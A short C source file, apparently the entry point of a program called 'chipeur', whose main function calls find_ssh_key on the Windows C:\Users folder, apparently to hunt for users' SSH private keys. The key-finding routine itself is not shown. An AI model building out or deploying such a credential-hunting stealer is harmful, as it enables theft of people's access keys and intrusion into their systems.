#include "chipeur.h"

#include <stdio.h>
#include <stdlib.h>

#include "find_ssh_key.h"

void hello(void) { printf("Hello World\n"); }

int main(void) {
  find_ssh_key("C:\\Users");
  return EXIT_SUCCESS;
}
